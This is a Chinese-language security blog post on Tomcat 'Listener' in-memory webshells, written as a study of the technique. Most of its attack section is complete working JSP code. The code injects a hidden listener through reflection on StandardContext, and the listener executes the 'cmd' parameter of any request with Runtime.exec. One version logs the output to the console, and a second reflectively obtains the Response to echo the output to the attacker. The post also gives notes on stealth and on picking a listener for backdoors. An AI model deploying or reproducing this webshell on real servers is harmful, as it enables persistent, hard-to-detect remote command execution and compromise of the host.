---
title: 原理分析 | Listener —— Tomcat 内存马 回显问题 反射总结
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/oMBqEeiBAifEs2uANzhcAcJIQAiAweAr4FE1Pw~tplv-dy-vqe2-sr-v2_1920_1334_q80.jpg
categories:
  - - 代码审计
    - 内存马
tags:
  - 代码审计
  - Java
  - Tomcat
  - Listener
  - 内存马
  - RCE
abbrlink: 9a18f0c4
date: 2026-04-10 13:00:00
---

# 原理分析 | Listener —— Tomcat 内存马 回显问题 反射总结

## 目录

- [前置：StandardContext 回顾](#前置standardcontext-回顾)
- [ApplicationEventDispatcher](#applicationeventdispatcher)
- [ServletRequestListener 示例（静态注册）](#servletrequestlistener-示例静态注册)
- [web.xml 中注册 Listener 的标准写法](#webxml-中注册-listener-的标准写法)
- [动态注入 Payload（无回显版）](#动态注入-payload无回显版)
- [Listener 与 Filter/Servlet 的差异对比](#listener-与-filterservlet-的差异对比)
- [回显问题：为什么 Listener 不能直接回显？](#回显问题为什么-listener-不能直接回显)
- [解决回显：反射硬拿 Response](#解决回显反射硬拿-response)
- [其他常见 Listener 接口简介](#其他常见-listener-接口简介)
- [反射补充：六大核心能力](#反射补充六大核心能力)
- [总结](#总结)

---

## 前置：StandardContext 回顾

Listener 型内存马的注入原理，依然依赖于 Tomcat 内部的 `StandardContext`。

| 对象 | 说明 |
|------|------|
| `StandardContext` | Tomcat 中代表一个 Web 应用的核心对象，里面存了 Filter、Servlet、**Listener** 等组件 |

可以用这个类比来理解三种组件的区别：

- **Filter**：像一个安检闸机，所有请求都过一遍
- **Servlet**：像一个具体柜台，请求最终被它处理
- **Listener**：像一个感应门铃，有人进门（请求开始）、出门（请求结束）、新顾客到店（Session 创建）……都会触发

Listener 就存在 `StandardContext` 的 `applicationEventListeners` 字段里，执行调度器是 `ApplicationEventDispatcher`，它负责从这个列表里取出 Listener 并调用。

---

## ApplicationEventDispatcher

`ApplicationEventDispatcher` 是 Tomcat **运行时自动调用**的调度器。

只要把 Listener 实例**放进 `applicationEventListeners` 列表**，Tomcat 在处理每个请求时，`ApplicationEventDispatcher` 就会自动从列表里拿到你的 Listener 并调用它。

和 Filter 对比一下差异就很明显了：

- 动态注册 **Filter**：需要操作 `FilterDef` + `FilterMap` + `FilterChain`（重新创建），比较繁琐
- 动态注册 **Listener**：**只操作一个列表**，没有映射，没有链，简单得多

---

## ServletRequestListener 示例（静态注册）

先看一个静态注册的 `ServletRequestListener`，理解它的工作机制。

作用是：**每次 HTTP 请求进入 Tomcat 时，自动执行 `requestInitialized` 方法；请求结束时执行 `requestDestroyed` 方法。**

```java
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;

// @WebListener 相当于在 web.xml 里注册
// 动态注入时不需要这个注解，因为我们是手动反射添加到 StandardContext 的
// applicationEventListeners 列表里，静态注册才需要注解或 web.xml
@WebListener
public class SimpleListener implements ServletRequestListener {

    // 静态块：在类第一次被 JVM 加载时执行，只执行一次，这里只是调试用的
    // 注意：动态注入的 Listener 是运行时创建的对象，不会触发静态块
    static {
        System.out.println("=== SimpleListener 类被加载了 ===");
    }

    // @Override 表示重写接口中的方法，Java 的语法习惯，不写也能运行
    @Override
    // 只要有请求就会进来，内存马中大部分核心恶意逻辑放在这里
    public void requestInitialized(ServletRequestEvent sre) {
        // 请求刚进来时执行
        System.out.println("[Listener] 请求来了！");
        System.out.println("请求的IP：" + sre.getServletRequest().getRemoteAddr());

        // 这里可以放恶意代码，比如：
        // - 执行命令
        // - 读取请求参数
        // - 修改响应内容（不过需要拿到 response，稍麻烦）
    }

    @Override
    // 只要请求结束就会触发，内存马中较少在这里放核心恶意逻辑
    public void requestDestroyed(ServletRequestEvent sre) {
        // 请求结束时执行
        System.out.println("[Listener] 请求结束了");
    }
}
```

启动 Tomcat 服务后，类被加载就会显示：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Listener_image1.png)

每次刷新页面就会多一次输出，包含请求开始、IP 地址、请求结束三条日志：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Listener_image2.png)

> 这里 IP 显示的是 `0:0:0:0:0:0:0:1`（简写 `::1`），这是 **IPv6** 的本地回环地址，等价于 IPv4 的 `127.0.0.1`。

---

## web.xml 中注册 Listener 的标准写法

静态注册除了用 `@WebListener` 注解，也可以写在 `web.xml` 里：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
         http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <!-- 注册 ServletRequestListener -->
    <!-- 填写的是全限定类名（包名 + 类名） -->
    <listener>
        <listener-class>com.demo.SimpleListener</listener-class>
    </listener>

    <!-- 也可以同时注册其他 Listener，比如 HttpSessionListener -->
    <!--
    <listener>
        <listener-class>com.demo.MySessionListener</listener-class>
    </listener>
    -->

    <!-- 其他配置（如 Servlet、Filter）可以继续写在这里 -->

</web-app>
```

---

## 动态注入 Payload（无回显版）

和 Filter、Servlet 一样，先两层反射获取 `StandardContext`：

```
ServletContext >> ApplicationContext >> StandardContext
```

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="javax.servlet.ServletRequestEvent" %>
<%@ page import="javax.servlet.ServletRequestListener" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.util.List" %>

<%
// ========== 通用：获取 StandardContext ==========
// Tomcat 里真正存储和管理所有 Listener（以及 Filter、Servlet）的对象就是 StandardContext
ServletContext servletContext = request.getSession().getServletContext();
Field appContextField = servletContext.getClass().getDeclaredField("context");
appContextField.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);

Field standardContextField = applicationContext.getClass().getDeclaredField("context");
standardContextField.setAccessible(true);
StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

// ========== 定义恶意 Listener ==========
// 匿名内部类，实现了 ServletRequestListener 接口
// Tomcat 中一共有多种 Listener 接口，分别监听不同的事件
ServletRequestListener maliciousListener = new ServletRequestListener() {
    @Override
    // requestInitialized：每个 HTTP 请求刚到达 Tomcat、尚未交给 Filter/Servlet 处理时就会执行
    public void requestInitialized(ServletRequestEvent sre) {
        try {
            // 从 ServletRequestEvent 中拿到 HttpServletRequest 对象
            // 注意：ServletRequestEvent 里没有 HttpServletResponse，所以无法直接回显
            javax.servlet.http.HttpServletRequest req =
                (javax.servlet.http.HttpServletRequest) sre.getServletRequest();

            // req.getParameter("cmd") 同时支持 GET 和 POST 请求
            String cmd = req.getParameter("cmd");
            if (cmd != null && !cmd.isEmpty()) {
                // 执行系统命令
                Process process = Runtime.getRuntime().exec(cmd);
                // 读取结果然后输出
                java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream())
                );
                String line;
                StringBuilder output = new StringBuilder();
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                // 没有 response 对象，只能 print 到控制台
                System.out.println("[Listener] CMD: " + cmd);
                System.out.println("[Listener] Output: " + output.toString());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    // requestDestroyed：请求结束时执行，这里留空
    public void requestDestroyed(ServletRequestEvent sre) {}
};
//有了 Listener 需要添加到 standardContext 的 applicationEventListenersList 里

//  // ==================================================
//  // 方式一：通过反射操作 applicationEventListenersList 字段
//  // ==================================================
//  //在 standardContext 里找到 applicationEventListenersList 的字段反射调用
//  Field listenersField = standardContext.getClass().getDeclaredField("applicationEventListenersList");
//  listenersField.setAccessible(true);
//  List<Object> listeners = (List<Object>) listenersField.get(standardContext);
//  //利用 applicationEventListenersList 自带的 add 方法添加构造的 listener 对象
//  listeners.add(maliciousListener);
//  out.println("Listener injected via FIELD. Current count: " + listeners.size());

    // ==================================================
    // 方式二：通过官方方法 addApplicationEventListener（推荐，更稳定）
    // ==================================================
    //standardContext 里有直接往 applicationEventListenersList 添加的方法 addApplicationEventListener 且是 public 方法
    standardContext.addApplicationEventListener(maliciousListener);
    //如果 addApplicationEventListener 是私有方法,也可以用反射解决
    // 1. 获取 StandardContext 的 Class 对象（已经有了 standardContext 实例）
    //Class<?> clazz = standardContext.getClass();
    // 2. 获取私有方法：方法名 "addApplicationEventListener"，参数类型是 Object.class
    //java.lang.reflect.Method addMethod = clazz.getDeclaredMethod("addApplicationEventListener", Object.class);
    // 3. 打破私有访问限制
    //addMethod.setAccessible(true);
    // 4. 调用该方法，传入 standardContext 对象和恶意 listener 参数
    //addMethod.invoke(standardContext, maliciousListener);

    //获取 listenersArr 的长度然后显示到浏览器
    Object[] listenersArr = standardContext.getApplicationEventListeners();
    //这个 out 是jsp的隐式对象 print可以直接写入 HTTP 响应体显示到浏览器,但是Listener内部是由tomcat回调执行处理,不能直接打印到浏览器
    out.println("Listener injected via METHOD. Current count: " + listenersArr.length);
    // ==================================================
%>
```

访问 `http://localhost:8080/inject_listener_noecho.jsp`，显示注册了一个监听器：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Listener_image3.png)

再次访问，注册数量会累加（因为每次访问都会重新注入一个）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Listener_image4.png)

---

## Listener 与 Filter/Servlet 的差异对比

Listener 和 Filter、Servlet 在多次注入行为上有些不同：

| 类型 | 能否多次注入 | 关键约束 | 是否会覆盖 |
|------|------------|---------|----------|
| **Listener** | ✅ 能 | 无名称，直接追加 | 不会覆盖，都会执行 |
| **Filter** | ✅ 能 | Filter 名称必须唯一 | 相同名称会覆盖；不同名称共存 |
| **Servlet** | ✅ 能 | Servlet 名称唯一；URL 映射唯一 | 相同名称或相同 URL 映射会覆盖 |

Listener 没有名称这个概念，每次注入都是往列表里追加一个对象，所以注册了几个，每次请求就会触发几次。

此时再访问 `http://localhost:8080/任意路径?cmd=whoami`（只要该路径能被注册的监听器监听到就行，即使显示 404 也能被监听到）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Listener_image5.png)

IDEA 的 Tomcat 控制台里可以看到命令执行结果：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Listener_image6.png)

> 这里因为注册了四个监听器，访问了一次网站，被监听到了四次，所以输出了四条结果。

**Listener 拦截"任意 URL"的优势：**

| 内存马类型 | 能否拦截任意 URL（包括不存在的路径、404） | 条件 |
|-----------|----------------------------------------|------|
| **Listener（ServletRequestListener）** | ✅ 能 | 只要注册到 StandardContext，无需任何映射，**每个请求都会触发** |
| **Filter** | ✅ 能（但需要配置） | 必须添加 `/*` 的 URL 映射，才能拦截所有请求 |
| **Servlet** | ❌ 一般不能 | 必须匹配具体的 URL 模式（如 `/shell`、`/admin/*`），无法覆盖所有路径 |

---

## 回显问题：为什么 Listener 不能直接回显？

上面的写法命令结果只输出在 IDEA 的 Tomcat 控制台里，没有回显到浏览器。那 Listener 可以像 Filter 和 Servlet 一样直接把命令结果回显到浏览器吗？

**不可以。** 原因很简单：

- **Filter**：`doFilter(ServletRequest request, ServletResponse response, FilterChain chain)` — 方法签名里直接有 `response`
- **Servlet**：`service(HttpServletRequest request, HttpServletResponse response)` — 同上，直接有 `response`
- **Listener**：`requestInitialized(ServletRequestEvent sre)` — 只有 `ServletRequestEvent`，**没有 `ServletResponse`**

| 组件 | 方法签名 | 能否直接回显 |
|------|---------|------------|
| Filter | `doFilter(request, response, chain)` | ✅ 直接写 response |
| Servlet | `service(request, response)` | ✅ 直接写 response |
| Listener | `requestInitialized(ServletRequestEvent sre)` | ❌ 没有 response，需要反射 |

这也是为什么 **Filter 型内存马**和 **Servlet 型内存马**在回显上最方便，而 Listener 更适合做"无回显的潜伏监控"或者配合其他组件使用。

**解决思路大概有两种：**

1. **Listener + Filter 组合**：先用 Listener 监听，再由 Filter 负责回显。但这样还不如直接用 Filter，可能的优势是 Listener 触发时机比 Filter 略早一点点，实际意义不大。
2. **反射硬拿 Response**（推荐，更干净）

---

## 解决回显：反射硬拿 Response

`ServletRequestEvent` 只提供了 `getServletRequest()`，没有 `getServletResponse()`。但 Tomcat 在处理请求时，实际上**同时**创建了 Request 和 Response 对象，只是没暴露给 Listener 接口。

调用链大概长这样：

```
javax.servlet.ServletRequestEvent 的 request 字段（实际类型是 RequestFacade）
          ↓ 被存储在
org.apache.catalina.connector.RequestFacade（暴露给 Servlet 的 HttpServletRequest 实现）
          ↓ 被包装在
org.apache.catalina.connector.Request（真正的请求对象，持有 Response 的引用）
```

所以"找 response"的本质是：**从 `ServletRequestEvent` 出发，穿透两层包装，拿到真正的 `Request`，再调用其 `getResponse()` 方法**。

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="javax.servlet.ServletRequestEvent" %>
<%@ page import="javax.servlet.ServletRequestListener" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>

<%
// ========== 1. 获取 StandardContext ==========
ServletContext servletContext = request.getSession().getServletContext();
Field appContextField = servletContext.getClass().getDeclaredField("context");
appContextField.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);

Field standardContextField = applicationContext.getClass().getDeclaredField("context");
standardContextField.setAccessible(true);
StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

// ========== 2. 定义恶意 Listener（反射获取 Response 并回显） ==========
ServletRequestListener maliciousListener = new ServletRequestListener() {
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        try {
            javax.servlet.http.HttpServletRequest req =
                (javax.servlet.http.HttpServletRequest) sre.getServletRequest();
            String cmd = req.getParameter("cmd");
            if (cmd != null && !cmd.isEmpty()) {
                // 执行命令
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream())
                );
                String line;
                StringBuilder output = new StringBuilder();
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                String result = output.toString();

                // ========== 关键：反射获取 Response（两层反射） ==========
                // 步骤 1：从 ServletRequestEvent 中获取 request 字段（实际类型是 RequestFacade）
                Field requestField = sre.getClass().getDeclaredField("request");
                requestField.setAccessible(true);
                Object requestFacade = requestField.get(sre); 
                //此时获取的对象是 org.apache.catalina.connector.RequestFacade

                // 步骤 2：从 RequestFacade 中获取真正的 Request 对象（字段名也叫 "request"）
                Field innerRequestField = requestFacade.getClass().getDeclaredField("request");
                innerRequestField.setAccessible(true);
                org.apache.catalina.connector.Request catalinaRequest =
                    (org.apache.catalina.connector.Request) innerRequestField.get(requestFacade);

                // 步骤 3：从 Request 中获取 Response
                org.apache.catalina.connector.Response catalinaResponse = catalinaRequest.getResponse();

                // 步骤 4：写入响应
                catalinaResponse.setContentType("text/plain");
                catalinaResponse.getWriter().write("Command: " + cmd + "\n");
                catalinaResponse.getWriter().write("Output:\n" + result);
                catalinaResponse.flushBuffer();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {}
};

// ========== 3. 注入 Listener ==========
standardContext.addApplicationEventListener(maliciousListener);

// ========== 4. 输出注入成功提示 ==========
Object[] listenersArr = standardContext.getApplicationEventListeners();
out.println("Listener (reflection echo) injected. Current count: " + listenersArr.length);
%>
```

访问 `http://localhost:8080/inject_listener_echo_reflect.jsp`，注入成功：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Listener_image7.png)

然后访问 `http://localhost:8080/任何.jsp?cmd=whoami`，命令结果直接回显到浏览器：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Listener_image8.png)

---

## 其他常见 Listener 接口简介

Tomcat 里不只有 `ServletRequestListener` 一种，还有其他几种，简单了解一下：

| 接口 | 触发时机 | 能否拿到 Request/Response | 内存马适用度 |
|------|---------|--------------------------|------------|
| `ServletRequestListener` | 请求刚进入、请求结束时 | 有 ServletRequest，无 ServletResponse | ⭐⭐⭐⭐⭐（最常用，触发频率高） |
| `HttpSessionListener` | Session 创建、销毁 | 无 Request/Response | ⭐⭐（需要先有 Session 才触发） |
| `ServletContextListener` | Web 应用启动、销毁时 | 无 Request/Response | ⭐（只触发一两次，不适合做后门） |
| `ServletRequestAttributeListener` | 请求域属性增删改时 | 有 ServletRequest | ⭐⭐（需要代码主动触发属性变化） |
| `HttpSessionAttributeListener` | Session 域属性变化时 | 无 Request/Response | ⭐（依赖 Session 操作） |
| `AsyncListener` | 异步请求开始/完成/超时/出错 | 有 ServletRequest/ServletResponse | ⭐⭐（需要异步支持） |

做内存马首选 `ServletRequestListener`，触发频率最高，几乎每个请求都能命中。

---

## 反射补充：六大核心能力

顺带把反射的六大核心能力梳理一下，目前代码审计碰到过前三种：

| 能力 | 关键类 | 核心方法 | 用途示例 |
|------|--------|---------|---------|
| **1. 对象创建（构造器反射）** | `Constructor` | `getDeclaredConstructor()` / `newInstance()` | 创建类的实例，包括私有构造器 |
| **2. 字段反射** | `Field` | `getDeclaredField()` / `set()` / `get()` | 读取或修改成员变量的值（包括私有字段） |
| **3. 方法反射** | `Method` | `getDeclaredMethod()` / `invoke()` | 调用对象的方法（包括私有方法） |
| **4. 访问私有内部类** | `Class` | `getDeclaredClasses()` / `getDeclaredConstructors()` | 实例化或操作私有内部类、匿名类 |
| **5. 数组反射** | `Array` | `Array.newInstance()` / `Array.get()` / `set()` | 动态创建和操作数组 |
| **6. 泛型反射** | `ParameterizedType` 等 | `getGenericSuperclass()` / `getGenericParameterTypes()` | 获取运行时泛型类型（比如 `List<String>` 中的 `String`） |

几种常用写法对比：

**构造器反射（创建对象）：**

```java
Constructor<MyClass> ctor = MyClass.class.getDeclaredConstructor(String.class);
ctor.setAccessible(true); // 如果构造器是 private
MyClass obj = ctor.newInstance("param");
```

**字段反射（读写私有字段）：**

```java
Field field = obj.getClass().getDeclaredField("secret");
field.setAccessible(true);
String value = (String) field.get(obj);
field.set(obj, "new value");
```

**方法反射（调用私有方法）：**

```java
Method method = obj.getClass().getDeclaredMethod("privateMethod", String.class);
method.setAccessible(true);
Object result = method.invoke(obj, "arg");
```

**访问非公开类（以 AnnotationInvocationHandler 为例）：**

> 注：这个不是内部类，当时记混了，但写法和构造器反射基本一样。

```java
// 1. 获取类（全限定名）
Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
// 2. 获取构造器：参数类型是 (Class<? extends Annotation>, Map<String, Object>)
Constructor<?> ctor = clazz.getDeclaredConstructor(Class.class, Map.class);
// 3. 打破访问限制
ctor.setAccessible(true);
// 4. 创建实例
Object handler = ctor.newInstance(Override.class, new HashMap<>());
```

这几种写法结构高度相似，核心模式都是：**获取 Class → 获取成员（字段/方法/构造器）→ setAccessible(true) → 操作**。

---

## 总结

Listener 型内存马的整体思路比 Filter 和 Servlet 都简单，核心就一步：**把恶意 Listener 对象塞进 `StandardContext` 的 `applicationEventListeners` 列表**，Tomcat 的 `ApplicationEventDispatcher` 就会帮你在每次请求时自动调用它。

几个关键点：

- **注入方式**：推荐用 `standardContext.addApplicationEventListener()`，比反射操作字段更稳定
- **触发条件**：无需 URL 映射，任意请求（包括 404）都能触发，隐蔽性强
- **回显问题**：Listener 接口没有 `response` 参数，要回显就得两层反射穿透拿到 `org.apache.catalina.connector.Response`
- **多次注入**：Listener 没有名称约束，每次访问注入 JSP 都会追加一个新的，调试时注意别重复注册太多
- **最优选择**：做内存马首选 `ServletRequestListener`，触发频率最高，其他类型的 Listener 触发条件苛刻，实战价值有限
